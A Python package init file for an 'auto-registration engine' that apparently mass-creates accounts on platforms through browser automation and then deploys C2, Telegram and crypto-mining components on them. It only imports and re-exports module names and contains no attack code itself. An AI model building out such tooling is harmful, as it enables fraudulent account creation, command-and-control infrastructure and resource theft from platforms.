"""Auto-registration engine - Automated account creation.

Components:
- engine: Main registration job engine
- worker: Browser automation worker
- auto_deploy: Post-registration deployment (C2, Telegram, Mining)
"""

from .engine import job_manager, account_store, PLATFORMS, RegistrationJob
from .auto_deploy import deploy_after_registration, AutoDeployer

__all__ = [
    "job_manager",
    "account_store",
    "PLATFORMS",
    "RegistrationJob",
    "deploy_after_registration",
    "AutoDeployer",
]
